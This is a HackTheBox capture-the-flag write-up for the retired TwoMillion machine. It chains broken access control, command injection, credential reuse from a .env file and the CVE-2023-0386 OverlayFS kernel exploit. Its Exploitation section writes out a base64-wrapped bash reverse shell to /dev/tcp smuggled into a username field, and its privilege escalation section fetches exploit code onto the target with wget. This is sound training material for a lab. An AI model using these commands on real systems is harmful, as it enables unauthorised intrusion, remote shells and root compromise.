# TwoMillion — HackTheBox

| | |
|---|---|
| **Difficulty** | Easy |
| **OS** | Linux (Ubuntu 22.04, kernel 5.15.70) |
| **Date** | April 2026 |
| **Status** | Retired (released directly to retired) |
| **Tags** | Broken Access Control, Command Injection, CVE-2023-0386 |

## Overview

TwoMillion was HackTheBox's celebratory machine for reaching 2 million members, recreating the original HTB invite flow. The path to root chains a broken access control flaw (self-promotion to admin), a command injection in an admin API endpoint, password reuse from a leaked `.env` file, and a kernel privilege escalation via CVE-2023-0386 (OverlayFS).

## Recon

```bash
nmap -sVC -Pn -oN nmap-scan.txt 10.129.51.198
```

- 22 (SSH), 80 (HTTP, nginx) — redirects to `2million.htb`

## Enumeration

```bash
gobuster dir -u http://2million.htb/ -w /usr/share/wordlists/dirb/common.txt -t 20 -b 301,404
```

Found `/invite`, `/login`, `/register`, and an authenticated `/api`. The invite page hinted at a ROT13-encoded endpoint name, which decoded to `POST /api/v1/invite/generate` — returning a Base64 invite code used to register an account.

## Exploitation

```bash
# 1. Self-promote to admin — broken access control, no server-side role check
curl -X PUT http://2million.htb/api/v1/admin/settings/update \
  -H "Cookie: PHPSESSID=<session>" -H "Content-Type: application/json" \
  -d '{"email":"user@example.htb","is_admin":1}'

# 2. Command injection in the VPN-generate endpoint (username param)
echo 'bash -i >& /dev/tcp/<tun0_ip>/4444 0>&1' | base64

curl -X POST http://2million.htb/api/v1/admin/vpn/generate \
  -H "Cookie: PHPSESSID=<session>" -H "Content-Type: application/json" \
  -d '{"username":"user;echo <base64_payload>|base64 -d|bash;"}'

# nc -lvnp 4444 -> shell as www-data
```

## Post-Exploitation — Lateral Movement

```bash
cat /var/www/html/.env
# DB_PASSWORD=<plaintext password>

ssh admin@10.129.51.198   # password reused from .env
```

## Privilege Escalation — CVE-2023-0386

A hint in `/var/mail/admin` referenced an unpatched OverlayFS/FUSE kernel CVE. Kernel 5.15.70 is vulnerable (patched in 6.2+).

```bash
git clone https://github.com/sxlmnwb/CVE-2023-0386
python3 -m http.server 8000

# On target
wget http://<tun0_ip>:8000/CVE-2023-0386 -r -np -R "index.html*"
make all
./fuse ./ovlcap/lower ./gc   # terminal 1
./exp                        # terminal 2 -> root shell
```

## Attack Chain

```
Register via invite (ROT13 + Base64) -> broken access control -> self-promote to admin
   -> command injection in /admin/vpn/generate -> shell as www-data
   -> .env leak -> password reuse -> SSH as admin (USER FLAG)
   -> CVE-2023-0386 (OverlayFS) -> root shell (ROOT FLAG)
```

## Vulnerability Summary

- Broken Access Control (IDOR)
- Command Injection (RCE)
- Sensitive Data Exposure (`.env`)
- Password Reuse
- CVE-2023-0386 (OverlayFS LPE)

## Lessons Learned

- Add the target hostname to `/etc/hosts` whenever nmap shows an HTTP redirect — vhost routing will block you otherwise.
- Gobuster can report wildcard false positives when a site redirects unknown paths to a custom 404; blacklist those codes with `-b`.
- Always check API responses for `enctype` hints — ROT13 and Base64 are common quick obfuscations.
- A reverse shell payload with special characters (`>&`) is safer wrapped in Base64 and piped through `base64 -d | bash`.
- Use the VPN interface (`tun0`) IP for reverse shells on HTB, not a local LAN IP.
- `.env` files in PHP web roots routinely hold plaintext DB credentials that get reused for system accounts.
- Check `/var/mail/<user>` early — internal "emails" on HTB boxes often hint directly at the privesc path.

---

Author: Hamza Al-Najjar (Z3R0) — see the [full writeup index](../../README.md)
